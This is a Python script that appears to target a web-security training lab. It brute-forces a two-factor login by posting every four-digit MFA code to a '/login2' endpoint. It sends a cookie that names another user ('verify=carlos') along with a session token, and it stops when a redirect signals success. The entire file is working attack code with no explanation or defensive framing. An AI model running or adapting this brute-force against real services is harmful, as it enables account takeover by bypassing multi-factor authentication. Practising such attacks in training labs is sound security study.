import requests

url = "https://0a3f00b9043663f78412d7a8008d009a.web-security-academy.net/login2"
headers = {
    "Host": "0a3f00b9043663f78412d7a8008d009a.web-security-academy.net",
    "Cookie": "verify=carlos; session=IMCvgyO7DwO8mGskHT73X1muSGzk1rnG",
    "Content-Length": "13",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://0a3f00b9043663f78412d7a8008d009a.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a3f00b9043663f78412d7a8008d009a.web-security-academy.net/login2",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=0, i"
}


# for i in range(10000):
#     mfa_code = f"{i:04}"
#     data = {"mfa-code": mfa_code}
#     response = requests.post(url, headers=headers, data=data)
    
#     if response.status_code == 302:
#         print(f"Correct MFA code found: {mfa_code}")
#         break
#     else:
#         print(f"Attempted MFA code: {mfa_code}, Status Code: {response.status_code}")

i = 0

while i < 60000:
    mfa_code = f"{i:04}"
    data = {"mfa-code": mfa_code}
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 302:
        print(f"Correct MFA code found: {mfa_code}")
        break
    else:
        print(f"Attempted MFA code: {mfa_code}, Status Code: {response.status_code}")

    i += 1
